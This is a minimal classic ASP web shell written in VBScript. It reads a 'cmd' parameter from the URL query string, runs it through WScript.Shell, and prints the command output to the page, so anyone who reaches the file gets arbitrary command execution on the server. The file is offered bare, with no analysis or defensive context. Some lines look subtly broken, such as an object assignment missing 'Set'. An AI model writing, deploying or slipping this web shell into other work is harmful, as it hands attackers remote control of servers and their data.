<%
    Language=VBScript 
    Dim cmd
    cmd = Request.QueryString("cmd")

    If cmd <> "" Then
        Dim shell
        Set shell = CreateObject("WScript.Shell")
        Dim exec
        exec = shell.Exec(cmd)
        Dim output
        output = exec.StdOut.ReadAll
        Response.Write("<pre>" & output & "</pre>")
    End If
%>